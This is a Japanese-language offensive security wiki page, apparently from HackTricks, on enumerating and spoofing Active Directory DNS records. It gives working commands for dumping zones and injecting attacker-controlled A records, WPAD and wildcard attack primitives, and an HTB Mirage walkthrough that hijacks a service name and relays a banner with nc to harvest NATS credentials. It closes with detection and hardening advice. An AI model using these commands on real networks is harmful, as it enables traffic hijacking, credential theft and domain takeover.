# AD DNS レコード

{{#include ../../banners/hacktricks-training.md}}

デフォルトでは、Active Directory内の**any user**は、ドメインまたはフォレストのDNSゾーン内にあるDNSレコードを、zone transferに類似した方法で**enumerate all DNS records**できます（AD環境ではユーザがDNSゾーンの子オブジェクトを一覧できます）。

ツール[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)は、内部ネットワークのrecon用途のために、ゾーン内の**all DNS records**の**enumeration**および**exporting**を可能にします。
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) は JSON/Greppable (`--json`) 出力、マルチスレッド DNS 解決、および LDAPS にバインドする際の TLS 1.2/1.3 サポートを追加します。

詳しくは [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## レコードの作成 / 変更 (ADIDNS spoofing)

ゾーンの DACL では既定で **Authenticated Users** グループに **Create Child** が付与されているため、任意の domain account（または computer account）で追加のレコードを登録できます。これにより、traffic hijacking、NTLM relay coercion、あるいは full domain compromise に利用される可能性があります。

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py は Impacket ≥0.12.0 に同梱されています)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## 一般的な攻撃プリミティブ

1. **Wildcard record** – `*.<zone>` は AD DNS サーバを LLMNR/NBNS の spoofing に似たエンタープライズ全体のリスポンダに変えます。NTLM ハッシュをキャプチャしたり、それらを LDAP/SMB にリレーするために悪用できます。（WINS-lookup を無効化している必要があります。）
2. **WPAD hijack** – `wpad` を追加する（または攻撃者ホストを指す **NS** レコードを追加して Global-Query-Block-List を回避する）ことで、送信 HTTP リクエストを透過的にプロキシし、資格情報を収集できます。Microsoft は wildcard/DNAME のバイパスを修正しました（CVE-2018-8320）が、**NS-records still work**。
3. **Stale entry takeover** – 以前ワークステーションに属していた IP アドレスを主張すると、関連する DNS エントリは依然として解決され、DNS に触れずに resource-based constrained delegation や Shadow-Credentials 攻撃を可能にします。
4. **DHCP → DNS spoofing** – デフォルトの Windows DHCP+DNS 展開では、同一サブネット上の未認証の攻撃者が、動的 DNS 更新を引き起こす偽造 DHCP リクエストを送信することで、既存の任意の A レコード（Domain Controllers を含む）を上書きできます（Akamai “DDSpoof”, 2023）。これにより Kerberos/LDAP 上での machine-in-the-middle が可能になり、完全なドメイン乗っ取りにつながる可能性があります。
5. **Certifried (CVE-2022-26923)** – 自分が制御するマシンアカウントの `dNSHostName` を変更し、それに一致する A レコードを登録してから、その名前の証明書を要求することで DC を偽装できます。**Certipy** や **BloodyAD** などのツールがこのフローを完全に自動化します。

---

### Internal service hijacking via stale dynamic records (NATS case study)

動的更新が全ての認証済みユーザに対して開かれていると、**登録解除されたサービス名を再取得して攻撃者のインフラに向け直すことができます**。Mirage HTB DC は DNS scavenging 後にホスト名 `nats-svc.mirage.htb` を公開していたため、低権限のユーザであっても以下を行うことができました：

1. **レコードが存在しないことを確認する** と `dig` で SOA を確認：
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **レコードを再作成する** 攻撃者が制御する外部/VPNインターフェースに向ける:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. NATS クライアントは credentials を送信する前に `INFO { ... }` バナーを1つ受信することを期待するため、real broker からの正当なバナーをコピーするだけで secrets を harvest できます:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
乗っ取られた名前を解決するクライアントは、直ちにそのJSON `CONNECT` フレーム（`"user"`/`"pass"` を含む）をリスナーに leak します。攻撃者ホスト上で正式な `nats-server -V` バイナリを実行したり、ログの赤字化（log redaction）を無効にしたり、Wiresharkでセッションを盗聴したりすると、TLSが任意（optional）だったため、同じ平文の資格情報が得られます。

4. **Pivot with the captured creds** – Mirageでは、盗まれたNATSアカウントがJetStreamへのアクセスを提供し、再利用可能なADのユーザー名/パスワードを含む過去の認証イベントを露出させました。

このパターンは、非保護のTCPハンドシェイク（HTTP APIs、RPC、MQTTなど）に依存するすべてのAD統合サービスに当てはまります。DNSレコードが乗っ取られると、攻撃者はそのサービスになり代わります。

---

## 検出とハードニング

* 機微なゾーンでは **Authenticated Users** に対して *Create all child objects* の権限を拒否し、動的更新はDHCPが使用する専用アカウントに委任してください。
* 動的更新が必要な場合は、ゾーンを **Secure-only** に設定し、DHCPで **Name Protection** を有効にして、所有するコンピュータオブジェクトだけが自身のレコードを上書きできるようにします。
* `DNS Server` のイベントID 257/252（dynamic update）、770（zone transfer）および `CN=MicrosoftDNS,DC=DomainDnsZones` へのLDAP書き込みを監視してください。
* 危険な名前（`wpad`、`isatap`、`*`）は、意図的に無害なレコードでブロックするか、Global Query Block List を使用してブロックしてください。
* DNSサーバーはパッチ適用を維持してください。例として、RCEバグ CVE-2024-26224 と CVE-2024-26231 は **CVSS 9.8** に達し、Domain Controllers に対してリモートで悪用可能でした。



## 参考

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018、ワイルドカード/WPAD攻撃に関する事実上の標準的な参考資料として今も有効)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
